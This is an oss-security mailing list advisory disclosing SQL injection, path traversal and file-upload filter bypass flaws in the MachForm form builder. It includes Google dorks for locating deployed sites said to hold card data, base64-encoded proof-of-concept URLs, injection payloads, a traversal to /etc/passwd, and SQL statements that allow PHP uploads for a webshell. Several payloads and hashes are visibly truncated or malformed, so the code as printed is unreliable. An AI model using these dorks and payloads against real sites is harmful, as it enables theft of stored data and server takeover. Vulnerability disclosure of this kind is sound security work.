  oss-security - MachForm Multiple Vulnerabilities            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Wed, 30 May From: Amine Taouirsa <taouirsa@...il.com> To: vuln@...unia.com, bugs@...uritytracker.com,  	submissions@...ketstormsecurity.org, bugtraq@...urityfocus.com,  	oss-security@...ts.openwall.com Subject: MachForm Multiple Vulnerabilities   Vendor: Appnitro Product webpage: https://www.machform.com/ Full-Disclose: https://metalamin.github.io/MachForm-not-0-day-EN/ Fix:  Author: Amine Taouirsa Twitter: @metalamin  Google dork examples: ---------------------- "machform" inurl:"view.php" "machform" inurl:"embed.php"  Summary: --------- The form creation platform MachForm from Appnitro is subject to SQL injections that lead to path traversal and arbitrary file upload.  The application is widely deployed and with some google dorks it’s possible to find various webpages storing sensitive data as credit card numbers with corresponding security codes. Also, the arbitrary file upload can let an attacker get control of the server by uploading a WebShell.  [1] SQL injection -------------------------  [1.1] Description: The software is subject to SQL injections in the ‘download.php’ file.  [1.2] Parameters and statement: This SQLi can be found on the parameter ‘q’ which a base64 encoded value for the following parameters:    $form_id  = $params['form_id'];   $id       = $params['id'];   $field_name = $params['el'];   $file_hash  = $params['hash'];   So the injectable parameters are ‘el’ and ‘form_id’ obtaining error-based, stacked queries and time-based blind SQL injections. This is due to the following vulnerable statement:    $query  = "select {$field_name} from `".MF_TABLE_PREFIX."form_{$form_id}` where id=?";   [1.3] POC Proof of concept to get the first user mail:   http:// [URL] / [Machform_folder] /download.php?q=ZWw9IChTRUxFQ1 JZIHVzZXJfaWQgTElNSVQgMCwxKSwweDIwMjAsRkxPT1IoUkFORCgwKSoyKS  Which is the base64 encoding for:   el= (SELECT 1 FROM(SELECT FROM ap_users ORDER BY user_id LIMIT FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)   [2] Path traversal -----------------------------------  [2.1] Descrition download.php’ is used to serve stored files from the forms answers. Modifying the name of the file to serve on the corresponding ap_form table leads to a path traversal vulnerability.  [2.2] POC First we need to change the name for the element on the form: update set element_4="../../../../../../. ./../../../../../../../../../etc/passwd" where id=1;  Now in order to be able to download it, we need to access:   http:// [URL] / [Machform_folder] /download.php?q=ZWw9NCZpZD0xJm  Which is the base64 encoding for;    Note that hash is the MD5 of the corresponding filename:   md5("../../../../../../../../../../../../../../../../etc/passwd") =  [3] Bypass file upload filter ----------------------------------------------  When the form is set to filter a blacklist, it automatically add dangerous extensions to the filters. If the filter is set to a whitelist, the dangerous extensions can be bypassed.  This can be done directly on the database via SQLi update ap_form_elements set element_file_type_list="php",element_file_block_or_allow="a" where and element_id=4;  Once uploaded the file can be found and executed in the following URL: http:// [URL] / [Machform_folder] [filename]  The filename can be found in the database SELECT element_4 FROM WHERE id=1;   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      